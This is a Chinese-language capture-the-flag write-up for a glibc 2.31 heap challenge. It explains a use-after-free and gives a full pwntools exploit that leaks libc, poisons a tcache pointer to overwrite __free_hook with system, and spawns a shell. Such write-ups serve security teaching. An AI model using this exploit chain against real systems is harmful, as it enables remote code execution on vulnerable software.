# week4week4_pwn1(from:0xdeadc0de)

## 题目简述

题目是一个 64 位 Linux 堆菜单程序，可新增、删除、显示和编辑 note。程序开启了 PIE、NX、Canary 和 Full RELRO，但 `delete()` 释放堆块后没有清空全局指针，`show()` 与 `edit()` 也不检查对象是否仍有效，因此同时存在释放后读和释放后写。

## 解题过程

反编译后的关键逻辑可以概括为：

~~~c
heap[index] = malloc(size);       // add
read(0, heap[index], size);

free(heap[index]);                // delete，不置 NULL
puts(heap[index]);                // show，可读取已释放 chunk
read(0, heap[index], size);       // edit，可修改已释放 chunk
~~~

先申请一个 `0x800` 大块，并在它后面放置小块以阻止它与 top chunk 合并。释放大块后，它进入 unsorted bin，用户区开头的 `fd/bk` 会指向 libc 的 `main_arena`；通过 UAF `show(0)` 读取该指针，减去题目所用 glibc 2.31 中的偏移 `0x1ecbe0`，即可得到 libc 基址。

随后利用两个 `0x20` 实际大小的小块建立 tcache 链。释放顺序为 chunk 1、chunk 2，所以链头是 chunk 2。对已释放的 chunk 2 执行 `edit()`，把它的 `fd` 改成 `__free_hook`：第一次同尺寸 `malloc` 取回 chunk 2，第二次便返回 `__free_hook`，从而写入 `system` 地址。最后释放内容为 `/bin/sh\0` 的 chunk，实际调用变为 `system("/bin/sh")`。

题解所用 libc 偏移为：

~~~text
main_arena 泄漏位置：0x1ecbe0
__free_hook：         0x1eee48
system：              0x52290
~~~

完整 exploit 使用命令行参数接收目标地址，避免保留已经失效的比赛 IP：

~~~python
import sys

from pwn import context, p64, remote, u64

context.arch = "amd64"

host = sys.argv[1]
port = int(sys.argv[2])
io = remote(host, port)

MENU_END = b"4.edit a node\n"


def choose(number):
    io.sendlineafter(MENU_END, str(number).encode())


def add(index, size, content):
    choose(1)
    io.sendlineafter(b"Please input index\n", str(index).encode())
    io.sendlineafter(b"Please input size\n", str(size).encode())
    io.sendafter(b"Please input content\n", content)


def delete(index):
    choose(2)
    io.sendlineafter(b"Please input index\n", str(index).encode())


def show(index):
    choose(3)
    io.sendlineafter(b"Please input index\n", str(index).encode())
    return io.recvline(keepends=False)


def edit(index, size, content):
    choose(4)
    io.sendlineafter(b"Please input index\n", str(index).encode())
    io.sendlineafter(b"Please input size\n", str(size).encode())
    io.sendafter(b"Please input content\n", content)


add(0, 0x800, b"large")
add(1, 0x10, b"A" * 8)
add(2, 0x10, b"B" * 8)
add(3, 0x10, b"/bin/sh\x00")

delete(1)
delete(2)
delete(0)

arena_pointer = u64(show(0).ljust(8, b"\x00")[:8])
libc_base = arena_pointer - 0x1ECBE0
free_hook = libc_base + 0x1EEE48
system = libc_base + 0x52290

edit(2, 8, p64(free_hook))
add(4, 0x10, b"padding")
add(5, 0x10, p64(system))

delete(3)
io.interactive()
~~~

进入交互式 shell 后读取题目环境中的 flag 文件即可。

## 方法总结

完整链条是“UAF 读取 unsorted-bin 指针泄露 libc → UAF 修改 tcache `fd` → 将 `system` 写入 `__free_hook` → `free('/bin/sh')`”。Full RELRO 只保护 GOT，不能阻止写入当时 glibc 中仍存在的可写 hook；真正的根因是释放后仍允许 show 和 edit。
